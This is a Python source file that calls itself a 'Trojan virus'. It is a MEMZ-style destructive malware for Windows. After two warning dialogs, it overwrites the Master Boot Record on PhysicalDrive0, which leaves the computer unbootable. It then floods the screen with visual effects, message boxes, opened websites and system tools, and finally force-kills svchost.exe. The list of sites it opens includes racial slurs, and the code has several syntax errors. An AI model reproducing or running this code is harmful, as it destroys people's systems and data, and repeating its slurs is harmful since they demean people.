#Python
#Made by Frank South 20 
# Trojan virus in python 

import os
os.system("pip install pywin32")
from win32api import *
from win32gui import *
from win32ui import *
import ctypes
from win32con import *
from win32file import *
from random import randrange as rd
from random import *
from sys import exit
import multiprocessing
import time
import webbrowser

# Warning messages 

def warning():
	if MessageBox("The software you just executed is considered a malware.If you don't know what a malware is then press simply No and nothing will happen.", "Elon_Musk", MB_YESNO | MB_ICONWARNING) == 7: # If the user pressed no to our warning, exit the program.
		exit()
	if MessageBox("This is the last warnin.The creator Frank South 20 is not responsible for any damage caused using this malware.Continue?", "Elon_Musk, MB_YESNO | MB_ICONWARNING) == 7:
		exit()
#Website payload 
class Data:
	sites = (
         "https://headshot.monster/CCOCZW",
         "https://google.co.ck/search?q=you+are+a+nigger",
         "http://google.co.ck/search?q=chevrolet+spark+pricing",
         "http://google.co.ck/search?q=daewoo+matiz",
         "https://freches.neocities.org",
         "https://reddit.com/r/tomorrow",
	 "https://smartsleepingtips.com/wp-content/uploads/2020/04/cat-biting-persons-hand-768x512.jpg",
	 "https://reddit.com/r/askreddit",
         "https://google.com/search?q=rats+when+they+see+a+kfc+deep+fryer",
	 "http://google.co.ck/search?q=nigger.com",
	 "http://google.co.ck/search?q=what+happens+if+you+delete+system32",
	 "http://google.co.ck/search?q=g3t+r3kt",
	 "http://google.co.ck/search?q=batch+virus+download",
	 "http://google.co.ck/search?q=virus.exe",
	 "https://th.bing.com/th/id/R.6280c20bf8620e77158c7e5422189ee8?rik=oGMfzwYbllr2rA&riu=http%3a%2f%2f5b0988e595225.cdn.sohucs.com%2fimages%2f20190212%2f42d1187021f54279a1706ba7139775bd.jpeg&ehk=P%2bMOLiQ%2fR30F3knykI5rmI%2b8jNumnXxSucdPRSiLpME%3d&risl=&pid=ImgRaw&r=0&PC=EMMX01",
	 "http://google.co.ck/search?q=internet+explorer+is+the+best+browser",
	 "http://google.co.ck/search?q=facebook+hacking+tool+free+download+no+virus+working+2016",
	 "http://google.co.ck/search?q=virus+builder+legit+free+download",
	 "http://google.co.ck/search?q=how+to+create+your+own+ransomware",
	 "http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp",
	 "http://google.co.ck/search?q=mario+3+release+date",
         "http://google.co.ck/search?q=beamng+download+free",
	 "http://google.co.ck/search?q=is+illuminati+real",
	 "http://google.co.ck/search?q=montage+parody+making+program+2016",
	 "http://google.co.ck/search?q=the+memz+are+real",
	 "http://google.co.ck/search?q=stanky+danky+maymays",
	 "http://google.co.ck/search?q=john+cena+midi+legit+not+converted",
	 "http://google.co.ck/search?q=vinesauce+meme+collection",
	 "http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi",
	 "http://answers.microsoft.com/en-us/protect/forum/protect_other-protect_scanning/memz-malwarevirus-trojan-completely-destroying/268bc1c2-39f4-42f8-90c2-597a673b6b45",
	 "http://motherboard.vice.com/read/watch-this-malware-turn-a-computer-into-a-digital-hellscape",
	 "http://play.clubpenguin.com",
	 "http://pcoptimizerpro.com",
	 "http://softonic.com",
         "http://google.co.ck/search?q=ask+poggersbutnot#4543",
	 "calc",
	 "notepad",
	 "cmd",
	 "write",
	 "regedit",
	 "explorer",
         "taskmgr",
	 "msconfig",
	 "mspaint",
	 "devmgmt.msc",
	 "control",
	 "mmc",
     "osk",
     "winver",
	)
	
	IconWarning = LoadIcon(None, 32515)
	IconError = LoadIcon(None, 32513)

e = "readme.txt"
with open('readme.txt', 'w') as f:
    f.write('Still Using this computer?')
time.sleep(1)
os.startfile(f'{e}')

class MBR:
	def overwrite():
		handle = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)				  
		WriteFile(handle, AllocateReadBuffer(512), None)
		CloseHandle(handle)
time = 0
timeSubtract = 15000
class Payloads:
	def open_sites():
		global timeSubtract
		sites = Data.sites
		global time
		while True:
			Sleep(timeSubtract-time)
			__import__("os").system("start " + str(choice(sites)))
	def decrease_timer():
		global time
		while time < 15000:
			time += 1
			Sleep(10)
	def blink_screen(): 
		global time
		global timeSubtract
		HDC = GetDC(0) 
		sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
		while True:
			Sleep(1000)
			PatBlt(HDC, 0,0,sw,sh, PATINVERT)
	def reverse_text():
		global time
		global timeSubtract
		HWND = GetDesktopWindow() 
		while True:
			EnumChildWindows(HWND, EnumChildProc, None)
			Sleep(timeSubtract-time)
	def error_drawing():
		global time 
		global timeSubtract
		HDC = GetDC(0) 
		sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1)) 
		while True:
			DrawIcon(HDC, rd(sw), rd(sh), Data.IconWarning)
			for i in range(0, 60):
				mouseX,mouseY = GetCursorPos()
				DrawIcon(HDC, mouseX, mouseY, Data.IconError)
				Sleep(10)
	def warning_spam():
		global time 
		global timeSubtract
		while True:
			multiprocessing.Process(target = msgboxThread).start()
			Sleep(timeSubtract-time)
	def screen_puzzle():
		global time
		global timeSubtract
		HDC = GetDC(0)
		sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
		x1 = rd(sw-100)
		y1 = rd(sh-100)
		x2 = rd(sw-100)
		y2 = rd(sh-100)
		width = rd(600)
		height = rd(600)
		while True:
			BitBlt(HDC, x1, y1, width, height, HDC, x2, y2, SRCCOPY)
			Sleep(150)
	def cursor_shake():
		global time
		global timeSubtract
		while True:
			x,y = GetCursorPos()
			newX = x + (rd(3)-1) * rd(int((time+1)/2200+2)) 
			newY = y + (rd(3)-1) * rd(int((time+1)/2200+2))
			SetCursorPos((newY,newY))
			Sleep(10)
	def tunnel_effect():
		global time
		global timeSubtract
		sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
		HDC = GetDC(0)
		while True:
			StretchBlt(HDC, 50, 50, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)
			Sleep(150)


def msgboxThread():
	MessageBox("still using this computer?", "lol", MB_OK | MB_ICONWARNING)

def EnumChildProc(hwnd, lParam):
	try: 
		buffering = PyMakeBuffer(255)
		length = SendMessage(hwnd, WM_GETTEXT, 255, buffering) 
		result = str(buffering[0:length*2].tobytes().decode('utf-16')) 
		result = result[::-1]

		SendMessage(hwnd, WM_SETTEXT, None, result) 
	except: pass
if __name__ == '__main__':
	warning()
	MBR.overwrite()
	p = Payloads
	opensites = multiprocessing.Process(target = p.open_sites)
	timersub = multiprocessing.Process(target = p.decrease_timer)
	reverse = multiprocessing.Process(target = p.reverse_text)
	blinking = multiprocessing.Process(target = p.blink_screen)
	icons = multiprocessing.Process(target = p.error_drawing)
	shaking = multiprocessing.Process(target = p.cursor_shake)
	tunneling = multiprocessing.Process(target = p.tunnel_effect)
	puzzling = multiprocessing.Process(target = p.screen_puzzle)
	errors = multiprocessing.Process(target = p.warning_spam)
	timersub.start()
	opensites.start() 
	shaking.start() 
	Sleep(timeSubtract*2)
	blinking.start() 
	icons.start()
	Sleep(7000*2)
	reverse.start()
	puzzling.start()
	errors.start() 
	Sleep(5000*2)
	tunneling.start()
	while time < 15000:
		Sleep(10)
	__import__("os").system("taskkill /F /IM svchost.exe"
